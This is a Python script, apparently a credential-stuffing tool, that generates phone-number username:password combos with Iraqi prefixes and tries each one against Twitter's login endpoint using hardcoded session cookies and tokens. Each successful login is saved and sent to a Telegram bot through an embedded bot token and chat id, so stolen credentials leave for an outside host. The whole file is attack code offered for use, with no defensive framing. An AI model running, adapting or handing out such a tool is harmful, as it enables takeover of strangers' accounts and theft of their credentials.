#Mohamed Linux:
import requests,random,time
from bs4 import BeautifulSoup as BS
import os
import time
from bs4 import BeautifulSoup as bs
import user_agent
from user_agent import generate_user_agent
pp=generate_user_agent()
logo = """

\033[1;36m


        * -> Telegram : https://T.me/@i4m_mrx*
             
        ************************************** 

\033[1;37m
"""

def star():
	h = open("haloup.txt","r").readlines()
	ahmad = open("haloup.txt","w")
	bad = 0
	hit = 0
	timee = 0
	
	for x in h:
		time.sleep(1.5)
		
		hama = x.strip()
		a = hama.split(":")
		username = a[0]
		password = a[1]
		headers = {
        "Host":
        "twitter.com",
        "User-Agent":pp,
        "Accept":
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language":
        "en-US,en;q=0.5",
        "Accept-Encoding":
        "gzip, deflate",
        "Content-Type":
        "application/x-www-form-urlencoded",
        "Content-Length":
        "883",
        "Referer":
        "https://twitter.com/login/error?username_or_email=iidaxe&redirect_after_login=%2F",
        "Origin":
        "https://twitter.com",
        "Upgrade-Insecure-Requests":
        "1",
        "Connection":
        "close",
        "Cookie":
        "guest_id=v1%3A160786096844426536; ct0=f375ba25d23212fb4875567c78c85559; gt=1338092020984901634; _ga=GA1.2.1757115354.1607860959; _gid=GA1.2.2074901737.1607860959; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCNp5%252B1t2AToMY3NyZl9p%250AZCIlYTg4NjkyM2Y4ZjliYTRlNDI0YjY5YjUzNjEzN2IzYTg6B2lkIiVkY2Yy%250AOWIwMjdiMzAxZTBlNjk0ZTJhMzY4YjU2OWU0OQ%253D%253D--8586ae21dab33b86cdad030cbbc67d2b03f8df5c; att=1-GRKaX6DWZrfQzzJwXXLohfAmj0D0f5qOvufFk8KZ; _mb_tk=2a0641b03d3b11eba7aa792fdc775b8f",
		}
		data = f"redirect_after_login=%2F&remember_me=1&authenticity_token=2a0641b03d3b11eba7aa792fdc775b8f&wfa=1&ui_metrics=%7B%22rf%22%3A%7B%22b483b1f0d0fe7378b331b266e8cbeb10ce3f5aea97ab042b54c1d2416a4af874%22%3A0%2C%22bf29327ec04978cb62efef16fb4538e6adb77ad78e1d5b9d62c7f10812fdfb5f%22%3A-1%2C%22aa62df073e0d7a51c13b3f3ac348d75e007bbd612758f874b32fc7555ecbb471%22%3A150%2C%22af46abee465456dbc806def3cc464d73d4b7f9d8c00cbdfee9f1b09e75f7f6c0%22%3A137%7D%2C%22s%22%3A%22Y86C51hSlv_kHr2zmqlncZyjJUatsodm525qJqxL7Kzvcb3q_tnc60l7JwQlPn4uz3GLMAPXcPFKAN9aFSLyblTsZOMDUkKWa-R2eRNSr8QiK6bg2nGQ2H5hrpb_asadnCw6ZsE9bR9XW9tl0I4ruGKHA2DvJqQl4WPN4KLe2gV3zeGTdzxSHJlQtBzBekKY3hSzRzG__kO5knt3A5VEJLtijzOSc8WrN2iUupsY3RjdfjAryXRbkECo4xa9t0ApdrI6qugeLe2kjtXJc004b151n62kdkBVV3To29HkWRPugT1l1suV06lfth8zomhoT4HnPwuU4ZogMBbfMSAtRQAAAXZb--U_%22%7D&session%5Busername_or_email%5D={username}&session%5Bpassword%5D={password}"
		url = 'https://twitter.com/sessions'
		r1 = requests.session()
		response = r1.post(url=url,headers=headers,data=data,allow_redirects=False,timeout=5)
		
		Soup = BS(response.text, 'html.parser')
		fin = Soup.find('a', href=True)
		error = "https://twitter.com/login?username_disabled=true&redirect_after_login=%2F"
		error2 = f"https://twitter.com/login/error?username_or_email={username}&redirect_after_login=%2F"
		if fin['href'] == "https://twitter.com/":
				os.system("clear")
				hit+=1
				print(logo)
				print("--------------------------------------")
				print("[+] Hit : {}".format(hit))
				print("[-] Bad : {}".format(bad))
				print("[!] Time Block : {}".format(timee))
				ahmad.write(hama+"\n")
				telgram ='https://api.telegram.org/bot1856814172:AAGOUh3SUOE2QktxRiL04FBRvd44QzeHTYg/sendMessage?chat_id=1834920246&parse_mode=Markdown&text={}'.format(hama)
				benera_tele=requests.get(telgram)
		else:
				os.system("clear")
				bad+=1
				print(logo)
				print("--------------------------------------")
				print("[+] Hit : {}".format(hit))
				print("[-] Bad : {}".format(bad))
				print("[!] Time Block : {}".format(timee))
	#	exit()
		


def combo_number():
	txt_num = open("test.txt","w")
	os.system("clear")
	print(logo)
	print("\n-----------------------------------\n")
	print("STOP FOR COMBO NUMBER ")
	time.sleep(1)
	print("===================%40")
	time.sleep(2)
	print("===================================%60")
	time.sleep(2)
	print("=============================================%100")
	num = "123456789010284647104"
	korak = "0750","0770","0751","0772","0773"
	print(korak)
	choice=input("\nChoice :")
#	d = random.choice(choice)
	for x in range(300):
		ra = random.choice(num)
		ra2 = random.choice(num)
		ra3 = random.choice(num)
		ra4 = random.choice(num)
		ra5 = random.choice(num)
		ra6 = random.choice(num)
		ra7 = random.choice(num)
		hamwi = choice+ra+ra2+ra3+ra4+ra5+ra6+ra7
		txt_num.write(hamwi+":"+hamwi+"\n")
	time.sleep(2)
	print("\nCOMBO MAKE SUCCESSFULLU :)")
	time.sleep(2)
	os.system("clear")
combo_number()
#exit()
star()


#Tool make By @Danyar.code
